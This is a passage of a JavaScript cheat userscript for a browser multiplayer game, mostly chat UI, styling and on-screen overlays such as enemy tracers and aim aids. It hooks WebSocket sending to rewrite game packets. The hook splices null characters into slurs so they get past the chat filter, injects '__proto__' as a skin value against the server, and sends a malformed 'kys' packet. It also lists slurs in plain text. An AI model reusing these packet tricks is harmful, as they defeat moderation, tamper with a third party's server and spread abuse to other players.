          this.unread[k] = 0;
        } else {
          const maxY = Math.max(0, p.scrollHeight - p.clientHeight);
          p.scrollTop = Math.min(st.y | 0, maxY);
          this.atBottom[k] = this.isAtBottom(p);
          if (this.tab === k) this.checkRead(k);
        }
        this.updateBadges();
      });
    },
    fmtTime(ts = Date.now()) {
      const d = new Date(ts),
        h = d.getHours(),
        m = String(d.getMinutes()).padStart(2, "0");
      const ap = h >= 12 ? "PM" : "AM",
        hh = h % 12 || 12;
      return `[${hh}:${m} ${ap}]`;
    },
    esc(s) {
      return String(s).replace(
        /[&<>"']/g,
        (c) =>
          ({
            "&": "&amp;",
            "<": "&lt;",
            ">": "&gt;",
            '"': "&quot;",
            "'": "&#39;",
          })[c],
      );
    },
    updateBadges() {
      const open = this.chatLog?.classList.contains("active");
      if (!open) {
        this.chatLog?.querySelectorAll(".ChatTab").forEach((t) => {
          t.classList.remove("hasNew");
          const b = t.querySelector(".badge");
          if (b) b.textContent = "";
        });
        return;
      }
      this.chatLog.querySelectorAll(".ChatTab").forEach((tabEl) => {
        const k = tabEl.dataset.tab;
        const count = this.unread[k] | 0;
        const show = count > 0 && (this.tab !== k || !this.atBottom[k]);
        tabEl.classList.toggle("hasNew", show);
        const b = tabEl.querySelector(".badge");
        if (b) b.textContent = show ? (count > 99 ? "99+" : String(count)) : "";
      });
    },
    checkRead(tabKey) {
      const pane = this.panes?.[tabKey];
      if (!pane) return;
      const list = this.msgQ[tabKey];
      if (!list.length) return;
      const top = pane.scrollTop;
      const bottom = top + pane.clientHeight;
      let i = 0;
      while (i < list.length) {
        const node = list[i];
        if (!node || !node.isConnected) {
          list.splice(i, 1);
          continue;
        }
        const y0 = node.offsetTop;
        const y1 = y0 + node.offsetHeight;
        const visible = y1 >= top + 8 && y0 <= bottom - 8;
        if (!visible) break;
        list.splice(i, 1);
        node.__unreadQueued = false;
        this.unread[tabKey] = Math.max(0, (this.unread[tabKey] | 0) - 1);
      }
    },
    setTab(name) {
      const prev = this.tab;
      if (prev && this.panes?.[prev]) this.saveScroll(prev);
      this.tab = name;
      this.chatLog
        .querySelectorAll(".ChatTab")
        .forEach((x) => x.classList.toggle("active", x.dataset.tab === name));
      Object.entries(this.panes).forEach(([k, el]) =>
        el.classList.toggle("isHidden", k !== name),
      );
      this.restoreScroll(name);
      if (this.searchEl) {
        this.searchEl.value = "";
        this.setSearch("");
      }
      this.wake();
    },
    wake() {
      clearTimeout(this.idleT);
      clearTimeout(this.leaveT);
      this.chatLog.classList.add("wake");
      this.chatLog.classList.remove("idle");
      this.idleT = setTimeout(() => {
        if (!this.hover && !this.focused) this.setIdle(1);
      }, 2200);
    },
    deferIdle() {
      clearTimeout(this.leaveT);
      this.leaveT = setTimeout(() => {
        if (!this.hover && !this.focused) this.setIdle(1);
      }, 220);
    },
    setIdle(on) {
      this.chatLog.classList.toggle("idle", !!on);
      this.chatLog.classList.toggle("wake", !on);
    },
    normMsg(s) {
      return String(s ?? "")
        .trim()
        .replace(/\s+/g, " ")
        .toLowerCase();
    },
    setSearch(q) {
      this.searchQ = (q || "").trim().toLowerCase();
      this.applySearch();
    },
    applySearch() {
      const pane = this.panes?.[this.tab];
      if (!pane) return;
      const q = (this.searchQ || "").trim().toLowerCase();
      const nodes = pane.querySelectorAll(".ChatLine");
      nodes.forEach((n) => {
        const msgEl = n.querySelector(".msg");
        if (!msgEl) return;
        const base =
          msgEl.__base ??
          msgEl.getAttribute("data-base") ??
          msgEl.textContent ??
          "";
        const count =
          msgEl.__count ?? +(msgEl.getAttribute("data-count") || 1) ?? 1;
        const hit = !q || String(base).toLowerCase().includes(q);
        n.classList.toggle("isFiltered", !hit);
        if (hit) {
          this.renderMsg(msgEl, base, count, q);
        }
      });
    },
    bind() {
      const box = this.chatLog.querySelector("#ChatBodyBox");
      this.chatLog.addEventListener("click", (e) => {
        const t = e.target.closest(".ChatTab");
        if (!t) return;
        this.setTab(t.dataset.tab);
      });
      box.addEventListener("mouseenter", () => {
        this.hover = 1;
        this.wake();
      });
      box.addEventListener("mouseleave", () => {
        this.hover = 0;
        this.deferIdle();
      });
      this.searchEl = this.chatLog.querySelector("#ChatSearch");
      this.searchEl?.addEventListener("input", () => {
        this.setSearch(this.searchEl.value);
        this.wake();
      });
      this.searchEl?.addEventListener("keydown", (e) => {
        if (e.key === "Escape") {
          e.target.value = "";
          this.setSearch("");
          e.target.blur();
        }
      });
      this.input.addEventListener("focus", () => {
        this.focused = 1;
        this.wake();
        resetMoveDir();
      });
      this.input.addEventListener("keydown", (e) => {
        if (e.key === "Escape") {
          e.preventDefault();
          e.stopImmediatePropagation();
          this.input.value = "";
          this.input.blur();
          this.setIdle(1);
        }
      });
      this.input.addEventListener("blur", () => {
        this.focused = 0;
        this.deferIdle();
      });
      Object.entries(this.panes).forEach(([k, pane]) => {
        pane.addEventListener(
          "scroll",
          () => {
            this.atBottom[k] = this.isAtBottom(pane);
            if (this.tab === k) this.checkRead(k);
            if (this.atBottom[k]) {
              this.msgQ[k].length = 0;
              this.unread[k] = 0;
            }
            this.updateBadges();
          },
          { passive: true },
        );
      });
      this.chatLog.addEventListener("contextmenu", (e) => {
        const t = e.target.closest(".ChatTab");
        if (!t) return;
        e.preventDefault();
        const k = t.dataset.tab;
        if (!k || !this.panes?.[k]) return;
        this.unread[k] = 0;
        this.msgQ[k].length = 0;
        const p = this.panes[k];
        p.scrollTop = p.scrollHeight;
        this.atBottom[k] = true;
        this.updateBadges();
      });

      let blockNextEnterUp = false;

      const handleKeys = (e) => {
        if (!AB.Menu.ChatLog) return;
        const code = e.keyCode;
        const inInput =
          document.activeElement === this.input ||
          document.activeElement === this.searchEl;

        if (code === 27 && inInput) {
          e.preventDefault();
          e.stopImmediatePropagation();
          this.input.value = "";
          this.input.blur();
          this.setIdle(1);
          return;
        }

        if (code === 13) {
          e.preventDefault();
          e.stopImmediatePropagation();
          blockNextEnterUp = true;

          if (document.activeElement === this.input) {
            if (this.input.value) {
              sendChat(this.input.value);
            }
            this.input.value = "";
            setTimeout(() => this.input.blur(), 10);
            return;
          }

          if (!this.focused) {
            this.wake();
            this.input.focus();
          }
          return;
        }

        if (inInput) {
          e.stopImmediatePropagation();
        }
      };

      const blockKeys = (e) => {
        if (!AB.Menu.ChatLog) return;
        const code = e.keyCode;

        if (code === 13 && blockNextEnterUp) {
          e.preventDefault();
          e.stopImmediatePropagation();
          blockNextEnterUp = false;
          return;
        }

        if (
          document.activeElement === this.input ||
          document.activeElement === this.searchEl
        ) {
          e.stopImmediatePropagation();
        }
      };

      window.addEventListener("keydown", handleKeys, { capture: true });
      window.addEventListener("keyup", blockKeys, { capture: true });
      window.addEventListener("keypress", blockKeys, { capture: true });
    },

    enqueue(tab, m, c) {
      const key = tab && this.panes?.[tab] ? tab : "history";
      this.appendQ[key].push({ m, c: c || "#fff", ts: Date.now() });
      if (!this.appendRAF)
        this.appendRAF = requestAnimationFrame(() => this.flushAppend());
    },

    queueScrollToBottom(pane) {
      if (this.scrollRAF) return;
      this.scrollRAF = requestAnimationFrame(() => {
        this.scrollRAF = 0;
        pane.scrollTop = pane.scrollHeight;
      });
    },
    renderMsg(msgEl, base, count, q) {
      base = String(base ?? "");
      count = count | 0;
      const safe = this.esc(base);
      let html;
      if (!q) {
        html = safe;
      } else {
        const re = new RegExp(q.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "ig");
        html = safe.replace(re, (m) => `<mark>${m}</mark>`);
      }
      if (count > 1) html += ` <span class="x">${count}x</span>`;
      msgEl.innerHTML = html;
    },

    flushAppend() {
      this.appendRAF = 0;
      if (!this.panes) return;
      const chatOpen = this.chatLog.classList.contains("active");
      for (const k of ["history", "private", "log"]) {
        const pane = this.panes[k];
        const q = this.appendQ[k];
        if (!pane || !q.length) continue;
        const isCurrentTab = this.tab === k;
        const wasAtBottom = this.isAtBottom(pane);
        const frag = document.createDocumentFragment();
        const newNodes = [];
        for (let i = 0; i < q.length; i++) {
          const it = q[i];
          const norm = this.normMsg(it.m);
          const last = this.spam[k];
          const lastAlive =
            last &&
            last.node &&
            (last.node.isConnected || last.node.parentNode);
          if (lastAlive && last.norm === norm) {
            last.count++;
            const msgEl = last.node.querySelector(".msg");
            if (msgEl) {
              const base =
                msgEl.__base ??
                msgEl.getAttribute("data-base") ??
                msgEl.textContent ??
                "";
              msgEl.__base = base;
              msgEl.__count = last.count;
              msgEl.setAttribute("data-base", base);
              msgEl.setAttribute("data-count", String(last.count));
              this.renderMsg(msgEl, base, last.count, this.searchQ);
            }
            if (chatOpen && (!wasAtBottom || !isCurrentTab)) {
              this.unread[k] = (this.unread[k] | 0) + 1;
              if (!last.node.__unreadQueued) {
                last.node.__unreadQueued = true;
                this.msgQ[k].push(last.node);
              }
            }
            continue;
          }
          const line = document.createElement("div");
          line.className = "ChatLine isNew";
          const ts = document.createElement("span");
          ts.className = "ts";
          ts.textContent = this.fmtTime(it.ts);
          const msgEl = document.createElement("span");
          msgEl.className = "msg";
          msgEl.style.color = it.c;
          msgEl.__base = it.m;
          msgEl.__count = 1;
          msgEl.setAttribute("data-base", it.m);
          msgEl.setAttribute("data-count", "1");
          this.renderMsg(msgEl, msgEl.__base, msgEl.__count, this.searchQ);
          line.appendChild(ts);
          line.appendChild(msgEl);
          this.spam[k] = { norm, node: line, count: 1 };
          frag.appendChild(line);
          newNodes.push(line);
          if (chatOpen && (!wasAtBottom || !isCurrentTab)) {
            this.unread[k] = (this.unread[k] | 0) + 1;
            this.msgQ[k].push(line);
          }
        }
        q.length = 0;
        pane.appendChild(frag);
        setTimeout(() => {
          for (const n of newNodes) n.classList.remove("isNew");
        }, 220);
        if (wasAtBottom && isCurrentTab) {
          this.queueScrollToBottom(pane);
          this.atBottom[k] = true;
          this.unread[k] = 0;
          this.msgQ[k].length = 0;
        } else {
          this.atBottom[k] = this.isAtBottom(pane);
          if (isCurrentTab) this.checkRead(k);
        }
      }
      this.updateBadges();
      this.wake();
      if (this.searchQ) this.applySearch();
    },

    add(m, c = "#fff", tab = "history") {
      this.enqueue(tab, m, c);
    },
  },

  applyStyles() {
    const Ss = document.createElement("style");
    Ss.textContent = Object.values(this.styles).join(" ");
    document.head.appendChild(Ss);
  },
  Updates() {
    document
      .querySelectorAll('iframe[name="__tcfapiLocator"]')
      .forEach((el) => el.remove());
    document.querySelectorAll("textarea").forEach((el) => el.remove());

    if (this.Menu && this.Menu.updateMenuStyles) {
      this.Menu.updateMenuStyles();
    }

    if (typeof Mod !== "undefined" && Mod.Updates) {
      Mod.Updates();
    }
  },
  init() {
    this.applyStyles();
    setInterval(() => this.Updates(), 100);
    [this.Menu, this.playerLog, this.Chats].forEach((W) => W.init());
    const h = new Date().getHours();
    setTimeout(
      () =>
        AB.NotiDisplay.add(
          h < 5
            ? "Good evening"
            : h <= 12
              ? "Good morning"
              : h <= 18
                ? "Good afternoon"
                : "Good evening",
          "#9B5CFF",
          0,
        ),
      10,
    );

    setTimeout(() => {
      [
        "#errorNotification",
        "#promoImgHolder",
        "#youtuberOf",
        "#mobileInstructions",
        "#pre-content-container",
        "#cdm-zone-end",
        "#touch-controls-left",
        "#touch-controls-right",
        "#settingsButton",
        "#leaderboardButton",
        "#shutdownDisplay",
        "#downloadButtonContainer",
        "#mobileDownloadButtonContainer",
        "#promoImg",
        "#videoad",
        'script[src*="adsbygoogle"]',
        'textarea[aria-hidden="true"]',
      ].forEach((sel) => document.querySelector(sel)?.remove());
    }, 500);
  },
};
AB.init();
let configs = new Proxy(
  {},
  {
    get(target, k) {
      return AB.Menu[k];
    },
    set(target, k, v) {
      AB.Menu[k] = v;
      return true;
    },
  },
);

let mStatus = document.createElement("div");
mStatus.id = "status";
getEl("gameUI").appendChild(mStatus);
mStatus.style.cssText =
  "display:block;position:absolute;color:#000000;font:15px HammerSmith One;bottom:215px;left:20px;";
(function () {
  const sc = document.createElement("style");
  sc.textContent = `
.sizing { font-size: 15px; }
#uehmod { position: fixed; left: 165px; bottom: 20px; width: 140px; padding: 8px; background-color: rgba(0, 0, 0, 0.25); box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5); border-radius: 8px; display: flex; flex-direction: column; gap: 6px; }
.stats-row { display: flex; justify-content: space-between; align-items: center; font-size: 13px; }
.stats-label { color: #cfcfcf; }
.stats-value { color: #ffffff; font-weight: 700; }
.stats-group { display: flex; flex-direction: column; gap: 6px; }
.stats-divider { height: 1px; background: rgba(255,255,255,0.08); margin: 4px 0; }
`;
  document.head.appendChild(sc);
})();
const ueh = document.createElement("div");
ueh.id = "uehmod";
ueh.className = "sizing";
ueh.innerHTML = `
  <div class="stats-group">
    <div class="stats-row">
      <span class="stats-label">PING</span>
      <span id="pingFps" class="stats-value">None</span>
    </div>
    <div class="stats-row">
      <span class="stats-label">FPS</span>
      <span id="fpsCounter" class="stats-value">60</span>
    </div>
  </div>
  <div class="stats-divider"></div>
  <div class="stats-group">
    <div class="stats-row">
      <span class="stats-label">PACKET</span>
      <span id="packetStatus" class="stats-value">None</span>
    </div>
  </div>
`;
mStatus.appendChild(ueh);

let openMenu = false;

let WS = undefined;
let socketID = undefined;

let useWasd = false;
let secPacket = 0;
let secMax = 120;
let secTime = 1000;
let firstSend = {
  sec: false,
};
let game = {
  tick: 0,
  tickQueue: [],
  tickBase: function (set, tick) {
    if (this.tickQueue[this.tick + tick]) {
      this.tickQueue[this.tick + tick].push(set);
    } else {
      this.tickQueue[this.tick + tick] = [set];
    }
  },
  tickRate: 1000 / config.serverUpdateRate,
  tickSpeed: 0,
  lastTick: performance.now(),
};
let modConsole = [];

let dontSend = false;
let fpsTimer = {
  last: 0,
  time: 0,
  ltime: 0,
};
let lastMoveDir = undefined;
let lastsp = ["cc", 1, "__proto__"];

WebSocket.prototype.nsend = WebSocket.prototype.send;
WebSocket.prototype.send = function (message) {
  if (!WS) {
    WS = this;
    WS.addEventListener("message", function (msg) {
      getMessage(msg);
    });
    WS.addEventListener("close", (event) => {
      if (event.code == 4001) {
        window.location.reload();
      }
    });
  }
  if (WS == this) {
    dontSend = false;

    let data = new Uint8Array(message);
    let parsed = window.msgpack.decode(data);
    let type = parsed[0];
    data = parsed[1];

    if (type == "6") {
      if (data[0]) {
        let profanity = [
          "cunt",
          "whore",
          "fuck",
          "shit",
          "faggot",
          "nigger",
          "nigga",
          "dick",
          "vagina",
          "minge",
          "cock",
          "rape",
          "cum",
          "sex",
          "tits",
          "penis",
          "clit",
          "pussy",
          "meatcurtain",
          "jizz",
          "prune",
          "douche",
          "wanker",
          "damn",
          "bitch",
          "dick",
          "fag",
          "bastard",
        ];
        let tmpString;
        profanity.forEach((profany) => {
          if (data[0].indexOf(profany) > -1) {
            tmpString = "";
            for (let i = 0; i < profany.length; ++i) {
              if (i == 1) {
                tmpString += String.fromCharCode(0);
              }
              tmpString += profany[i];
            }
            let re = new RegExp(profany, "g");
            data[0] = data[0].replace(re, tmpString);
          }
        });

        data[0] = data[0].slice(0, 30);
      }
    } else if (type == "L") {
      data[0] = data[0] + String.fromCharCode(0).repeat(7);
      data[0] = data[0].slice(0, 7);
    } else if (type == "M") {
      data[0].name = data[0].name == "" ? "unknown" : "" + data[0].name;
      data[0].moofoll = true;
      data[0].skin = data[0].skin == 10 ? "__proto__" : data[0].skin;
      lastsp = [data[0].name, data[0].moofoll, data[0].skin];
    } else if (type == "D") {
      if (my.lastDir == data[0] || [null, undefined].includes(data[0])) {
        dontSend = true;
      } else {
        my.lastDir = data[0];
      }
    } else if (type == "d") {
      if (!data[2]) {
        dontSend = true;
      } else {
        if (![null, undefined].includes(data[1])) {
          my.lastDir = data[1];
        }
      }
    } else if (type == "K") {
      if (!data[1]) {
        dontSend = true;
      }
    } else if (type == "a") {
      if (data[1]) {
        if (player.moveDir == data[0]) {
          dontSend = true;
        }
        player.moveDir = data[0];
      } else {
        dontSend = true;
      }
    }
    if (!dontSend) {
      let binary = window.msgpack.encode([type, data]);
      this.nsend(binary);

      if (!firstSend.sec) {
        firstSend.sec = true;
        setTimeout(() => {
          firstSend.sec = false;
          secPacket = 0;
        }, secTime);
      }

      secPacket++;
    }
  } else {
    this.nsend(message);
  }
};

function packet(type) {
  let data = Array.prototype.slice.call(arguments, 1);
  let binary = window.msgpack.encode([type, data]);
  WS.send(binary);
}

function origPacket(type) {
  let data = Array.prototype.slice.call(arguments, 1);
  let binary = window.msgpack.encode([type, data]);
  WS.nsend(binary);
}

window.leave = function () {
  origPacket("kys", {
    "frvr is so bad": true,
    "sidney is too good": true,
    "dev are too weak": true,
  });
};

let io = {
  send: packet,
};

function getMessage(message) {
  let data = new Uint8Array(message.data);
  let parsed = window.msgpack.decode(data);
  let type = parsed[0];
  data = parsed[1];
  let events = {
    A: setInitData,
    C: setupGame,
    D: addPlayer,
    E: removePlayer,
    a: updatePlayers,
    G: updateLeaderboard,
    H: loadGameObject,
    I: loadAI,
    J: animateAI,
    K: gatherAnimation,
    L: wiggleGameObject,
    M: shootTurret,
    N: updatePlayerValue,
    O: updateHealth,
    P: killPlayer,
    Q: killObject,
    R: killObjects,
    S: updateItemCounts,
    T: updateAge,
    U: updateUpgrades,
    V: updateItems,
    X: addProjectile,
    3: setPlayerTeam,
    4: setAlliancePlayers,
    5: updateStoreItems,
    6: receiveChat,
    7: updateMinimap,
    8: showText,
    9: pingMap,
    0: pingSocketResponse,
  };
  if (type == "io-init") {
    socketID = data[0];
  } else {
    if (events[type]) {
      events[type].apply(undefined, data);
    }
  }
}

Math.lerpAngle = function (value1, value2, amount) {
  let difference = Math.abs(value2 - value1);
  if (difference > Math.PI) {
    if (value1 > value2) {
      value2 += Math.PI * 2;
    } else {
      value1 += Math.PI * 2;
    }
  }
  let value = value2 + (value1 - value2) * amount;
  if (value >= 0 && value <= Math.PI * 2) return value;
  return value % (Math.PI * 2);
};

CanvasRenderingContext2D.prototype.roundRect = function (x, y, w, h, r) {
  if (w < 2 * r) r = w / 2;
  if (h < 2 * r) r = h / 2;
  if (r < 0) r = 0;
  this.beginPath();
  this.moveTo(x + r, y);
  this.arcTo(x + w, y, x + w, y + h, r);
  this.arcTo(x + w, y + h, x, y + h, r);
  this.arcTo(x, y + h, x, y, r);
  this.arcTo(x, y, x + w, y, r);
  this.closePath();
  return this;
};

function resetMoveDir() {
  keys = {};
  io.send("e");
}

let allChats = [];
let ticks = {
  tick: 0,
  delay: 0,
  time: [],
  manage: [],
};
let ais = [];
let players = [];
let alliances = [];
let alliancePlayers = [];
let gameObjects = [];
let liztobj = [];
let projectiles = [];
let deadPlayers = [];
var volcano = {
  xof: undefined,
  yof: undefined,
  animationTime: 0,
  land: null,
  lava: null,
  x: config.volcanoLocationX,
  y: config.volcanoLocationY,
};
let breakObjects = [];

const Mod = {
  player: null,
  playerSID: null,
  tmpObj: null,
  enemy: [],
  nears: [],
  near: [],

  bloodParticles: [],
  damageAccumulator: {},

  my: {
    reloaded: false,
    waitHit: 0,
    autoAim: false,
    revAim: false,
    ageInsta: true,
    reSync: false,
    bullTick: 0,
    anti0Tick: 0,
    antiSync: false,
    safePrimary: function (tmpObj) {
      return [0, 8].includes(tmpObj.primaryIndex);
    },
    safeSecondary: function (tmpObj) {
      return [10, 11, 14].includes(tmpObj.secondaryIndex);
    },
    lastDir: 0,
    autoPush: false,
    pushData: {},
  },

  attackState: 0,
  inGame: false,
  macro: {},
  mills: { place: 0, placeSpawnPads: 0 },
  lastDir: undefined,
  lastLeaderboardData: [],

  Visuals: {
    renderBloodParticles() {
      if (typeof updateBloodParticles === "function") updateBloodParticles();
    },

    createBloodSplatter(x, y, amount, damage) {
      if (typeof createBloodSplatter === "function") {
        createBloodSplatter(x, y, amount, damage);
      }
    },

    getGameCanvas() {
      return gameCanvas;
    },

    getContext() {
      return mainContext;
    },

    tracer(enemy, size = 10, color = "#ff0000") {
      if (!enemy || !mainContext) return;
      Mod.Draw.Tracer(mainContext, enemy, size, color);
    },

    arrow(enemy, size = 20, color = "#ff0000") {
      if (!enemy || !player || !mainContext) return;
      Mod.Draw.Arrow(mainContext, enemy, size, color);
    },

    line(target, width = 3, color = "#ffffff") {
      if (!target || !player || !mainContext) return;
      Mod.Draw.Line(mainContext, player, target, width, color);
    },

    dashLine(target, dashLength = 5, width = 2, color = "#ffffff") {
      if (!target || !player || !mainContext) return;
      Mod.Draw.DashLine(mainContext, player, target, dashLength, width, color);
    },

    circle(x, y, radius, color = "#ffffff80", fill = false) {
      if (!mainContext) return;
      Mod.Draw.Circle(
        mainContext,
        x,
        y,
        radius,
        0,
        Math.PI * 2,
        2,
        color,
        fill,
      );
    },

    playerCircle(radius, color = "#ffffff80", fill = false) {
      if (!player || !mainContext) return;
      Mod.Draw.Circle(
        mainContext,
        player.x,
        player.y,
        radius,
        0,
        Math.PI * 2,
        2,
        color,
        fill,
      );
    },

    healthBar(entity, value = 1, color = "#00ff00") {
      if (!entity || !mainContext) return;
      Mod.Draw.Bar(
        mainContext,
        entity.x,
        entity.y,
        entity.scale || 35,
        value,
        color,
      );
    },

    reloadBar(x, y, value, color = "#00ff00", xFill = null) {
      if (!mainContext) return;
      Mod.Draw.Bar(mainContext, x, y, 0, value, color, true, xFill);
    },

    text(text, x, y, fontSize = "20", color = "#ffffff") {
      if (!mainContext) return;
      Mod.Draw.Text(mainContext, text, x, y, fontSize, color);
    },

    playerName(player, text, fontSize = "20", color = "#ffffff") {
      if (!player || !mainContext) return;
      const offsetY = (player.scale || 35) + 20;
      Mod.Draw.Text(
        mainContext,
        text,
        player.x,
        player.y - offsetY,
        fontSize,
        color,
      );
    },

    image(data, x, y, dir = 0, alpha = 1) {
      if (!mainContext) return;
      Mod.Draw.DrawImage(mainContext, data, x, y, dir, alpha);
    },

    nearPlayers() {
      if (!Mod.nears || !mainContext) return;
      Mod.nears.forEach((nearPlayer) => {
        if (nearPlayer && nearPlayer.visible !== false) {
          this.line(nearPlayer, 2, "#ffff00");
        }
      });
    },

    marker(obj, color = "#00ff00") {
      if (!obj || !mainContext) return;
      Mod.Draw.Circle(
        mainContext,
        obj.x,
        obj.y,
        obj.scale || 50,
        0,
        Math.PI * 2,
        3,
        color,
      );
    },

    placement(x, y, scale, canPlace = true) {
      if (!mainContext) return;
      const color = canPlace ? "#00ff0080" : "#ff000080";
      Mod.Draw.Circle(mainContext, x, y, scale, 0, Math.PI * 2, 2, color, true);
    },

    direction(angle, length = 100, color = "#ffffff") {
      if (!player || !mainContext) return;
      const endX = player.x + Math.cos(angle) * length;
      const endY = player.y + Math.sin(angle) * length;
      Mod.Draw.Line(mainContext, player, { x: endX, y: endY }, 3, color);
    },

    trapWarning(trap, color = "#ff0000") {
      if (!trap || !mainContext) return;
      const scale = trap.scale || 50;
      Mod.Draw.Circle(
        mainContext,
        trap.x,
        trap.y,
        scale + 10,
        0,
        Math.PI * 2,
        3,
        color,
      );
      this.text("!", trap.x, trap.y - scale - 20, "30", color);
    },

    spikeTick(spike, color = "#ff9900") {
      if (!spike || !mainContext) return;
      const scale = spike.scale || 50;
      Mod.Draw.Circle(
        mainContext,
        spike.x,
        spike.y,
        scale,
        0,
        Math.PI * 2,
        4,
        color,
      );
      Mod.Draw.Circle(
        mainContext,
        spike.x,
        spike.y,
        scale + 15,
        0,
        Math.PI * 2,
        2,
        color,
      );
    },

    clear() {
      if (!mainContext || !maxScreenWidth || !maxScreenHeight) return;
      mainContext.clearRect(0, 0, maxScreenWidth, maxScreenHeight);
    },

    Styles: {
      animation: `#ageBarBody, #nameInput, #itemInfoHolder, #scoreDisplay, #mapDisplay, .menuButton, .skinColorItem, .menuHeader, .actionBarItem, .resourceDisplay, #topInfoHolder, .gameButton, #chatHolder, #chatBox, #allianceMenu, #allianceHolder, .allianceButtonM, #storeMenu, .storeTab, #storeHolder, .storeItem, #storeButton, #allianceButton, #leaderboard, #killCounter { transition: 0.3s; } @keyframes partyGradient { 0% { background-position: 0% 50%; } 100% { background-position: 200% 50%; } }`,
      NotiDisplay: `.NotiDisplayHolder { background: linear-gradient(180deg, #181818, #242424); border: 1px solid rgba(255,255,255,0.06); border-radius: 12px; padding: 14px 20px; font-size: 16px; font-weight: 700; font-family: Roboto, Arial, sans-serif; color: #E0E0E0; position: fixed; left: 50%; top: 20px; transform: translateX(-50%);z-index: 10000; opacity: 0; transition: opacity 0.4s ease, top 0.4s ease; box-shadow: 0 12px 30px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.04); max-width: 600px; box-sizing: border-box; } .NotiDisplayHolder2 { font-size: 20px; background-color: rgba(0, 0, 0, 0.3); box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5); border-radius: 8px; color: #fff; padding: 12px 16px; position: fixed; top: 20px; left: 20px; opacity: 0; z-index: 50; transition: opacity 0.6s ease, top 0.4s ease; } .NotiDisplayHolder.show, .NotiDisplayHolder2.show { opacity: 1; } `,
      Custom: `#ageBar, .gameButton, #leaderboard, .resourceDisplay, #mapDisplay, #allianceHolder, #allianceInput, .allianceButtonM, #storeHolder, #ChatBodyBox, .storeTab, #chatBox, .actionBarItem, #PlayerLogBoard, .uiElement {  background-color: rgba(0, 0, 0, 0.25); box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5); border-radius: 8px; } .actionBarItem { background-size: cover; background-position: center; border-radius: 10px; } #ageBar { margin-bottom: 5px; } #leaderboard { width: 230px } #foodDisplay, #woodDisplay, #stoneDisplay, #killCounter, #scoreDisplay { line-height: 30px; background-size: 32px; background-position: center top 5px; padding: 30px 10px 0 10px; font-size: 20px; } #foodDisplay { bottom: 160px } #woodDisplay { bottom: 90px } `,
      Chat: `#chat { opacity: 0; visibility: hidden; transition: opacity .30s ease, visibility 0s linear .30s; } #chat.active { opacity: 1; visibility: visible; pointer-events: auto; transition: opacity .30s ease; } #chat, #chat * { scroll-behavior: auto !important; } #chat .ChatPane, #chat .ChatLine { overflow-anchor: none; } #ChatBodyBox { user-select: none; box-sizing: border-box; position: fixed; left: 20px; top: 20px; width: 460px; height: 320px; background: linear-gradient(180deg, rgba(18,18,18,.92), rgba(10,10,10,.86)); border: 1px solid rgba(255,255,255,.10); border-radius: 16px; z-index: 999; overflow: hidden; will-change: opacity; opacity: 0; transition: opacity .30s ease; } #chat.active #ChatBodyBox { opacity: 1; } #chat.active.idle #ChatBodyBox { opacity: 0; } #chat.active.wake #ChatBodyBox { opacity: 1; } #chat.wake #ChatInPut, #ChatBodyBox:hover #ChatInPut, #ChatInPut:focus { opacity: 1; } #ChatTabs { position: absolute; top: 0; left: 0; right: 0; height: 46px; padding: 4px 10px 0; display: flex; justify-content: flex-end; gap: 7px; z-index: 5; background: rgba(0,0,0,.18); border-bottom: 1px solid rgba(255,255,255,.06); box-sizing: border-box; } .ChatTab { position: relative; width: 34px; height: 34px; border-radius: 10px; display: flex; align-items: center; justify-content: center; cursor: pointer; user-select: none; background: rgba(255,255,255,.06); border: 1px solid rgba(255,255,255,.07); color: rgba(255,255,255,.75); transition: .18s transform, .18s background, .18s border-color, .18s color, .18s box-shadow; box-shadow: 0 6px 14px rgba(0,0,0,.35); } .ChatTab i, .ChatTab .material-icons { font-size: 18px !important; line-height: 1; pointer-events: none; } .ChatTab:hover { transform: scale(1.06); background: rgba(255,255,255,.10); color: #fff; } .ChatTab.active { background: rgba(155,92,255,.16); border-color: rgba(155,92,255,.42); color: #EDE7FF; box-shadow: 0 0 0 3px rgba(155,92,255,.12), 0 10px 20px rgba(0,0,0,.40); } .ChatTab[data-tip] { position: relative; } .ChatTab[data-tip]:hover::after { content: attr(data-tip); position: absolute; bottom: -40px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,.85); color: #fff; padding: 6px 10px; border-radius: 6px; font-size: 12px; white-space: nowrap; z-index: 100; pointer-events: none; } #ChatBody { position: absolute; top: 46px; left: 0; right: 0; bottom: 46px; overflow-y: auto; padding: 10px 14px; box-sizing: border-box; } #ChatBody::-webkit-scrollbar { width: 6px; } #ChatBody::-webkit-scrollbar-track { background: transparent; margin: 4px 0; } #ChatBody::-webkit-scrollbar-thumb { background: rgba(155,92,255,0.4); border-radius: 10px; border: 1px solid rgba(255,255,255,0.05); transition: all 0.3s; } #ChatBody::-webkit-scrollbar-thumb:hover { background: rgba(185,135,255,0.6); } #ChatBody { scrollbar-width: thin; scrollbar-color: rgba(155,92,255,0.4) transparent; } #ChatInPut { position: absolute; bottom: 0; left: 0; right: 0; height: 46px; padding: 0 14px; box-sizing: border-box; display: flex; align-items: center; gap: 10px; background: rgba(0,0,0,.25); border-top: 1px solid rgba(255,255,255,.06); opacity: 0; transition: opacity .30s ease; } #ChatInPut input { flex: 1; background: transparent; border: none; outline: none; color: #fff; font-size: 14px; } #ChatInPut input::placeholder { color: rgba(255,255,255,.5); } #ChatInPut button { background: rgba(155,92,255,.25); border: 1px solid rgba(155,92,255,.4); color: #EDE7FF; border-radius: 8px; padding: 6px 12px; font-size: 12px; cursor: pointer; transition: all .18s; } #ChatInPut button:hover { background: rgba(155,92,255,.4); } `,
      Logs: `#PlayerLog { position: relative; opacity: 1; pointer-events: none; transition: opacity 0.5s ease-out; } #PlayerLogBoard { position: fixed; right: 20px; top: 20px; color: #fff; font-size: 31px; text-align: left; padding: 10px; width: 220px; background-color: rgba(0, 0, 0, 0.25); border-radius: 4px; transform: translateX(100%); opacity: 0; transition: transform 0.5s ease-out, opacity 0.5s ease-out; } #PlayerLogBoard.active { transform: translateX(0%); opacity: 1; } .PlayerLogHolder { overflow: hidden; white-space: nowrap; } .PlayerLogitems { color: #fff; display: inline-block; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; font-size: 18px; }`,
